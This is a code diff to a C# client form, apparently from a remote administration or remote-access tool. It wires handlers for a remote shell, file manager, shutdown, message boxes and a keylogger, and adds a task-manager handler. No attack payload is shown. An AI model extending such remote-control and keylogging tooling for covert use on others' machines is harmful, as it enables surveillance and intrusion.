@@ -22,11 +22,12 @@ namespace Client
         private SystemInfoHandler? _systemInfoHandler;
         private RemoteShellHandler? _remoteShellHandler;
         private FileManagerHandler? _fileManagerHandler;
+        private TaskManagerHandler? _taskManagerHandler;
         private MessageBoxHandler? _messageBoxHandler;
         private ShutdownActionHandler? _shutdownActionHandler;
         private KeyLoggerHandler? _keyLoggerHandler;
 
-        public MainClientForm()
+		public MainClientForm()
         {
             InitializeComponent();
         }
@@ -39,12 +40,14 @@ namespace Client
             var remoteShellService = new RemoteShellService();
             var fileManagerService = new FileManagerService();
             var messageBoxService = new MessageBoxService();
+            var taskManagerService = new TaskManagerService();
             var shutdownActionService = new ShutdownActionService();
             var keyLoggerService = new KeyLoggerService(_connection);
             _systemInfoHandler = new SystemInfoHandler(sysService, _connection);
             _remoteShellHandler = new RemoteShellHandler(remoteShellService, _connection);
             _fileManagerHandler = new FileManagerHandler(fileManagerService, _connection);
             _messageBoxHandler = new MessageBoxHandler(messageBoxService, _connection);
+            _taskManagerHandler = new TaskManagerHandler(taskManagerService, _connection);
             _shutdownActionHandler = new ShutdownActionHandler(shutdownActionService, _connection);
             _keyLoggerHandler = new KeyLoggerHandler(keyLoggerService);
             _packetHandler = new PacketHandler(
@@ -55,7 +58,8 @@ namespace Client
                onShutdownActionRequest: sdreq => _shutdownActionHandler!.HandleAsync(sdreq),
                onKeyLoggerStart: kls => _ = _keyLoggerHandler!.HandleStartAsync(kls),
                onKeyLoggerStop: klt => _ = _keyLoggerHandler!.HandleStopAsync(klt),
-               onKeyLoggerLangToggle: l => _ = _keyLoggerHandler!.HandleLangToggleAsync(l)
+               onKeyLoggerLangToggle: l => _ = _keyLoggerHandler!.HandleLangToggleAsync(l),
+               onTaskManagerRequest: treq => _ = _taskManagerHandler!.HandleAsync(treq)
            );
             _connection.OnLineReceived += line => _packetHandler.HandleLine(line);
             _connection.OnDisconnected += () =>
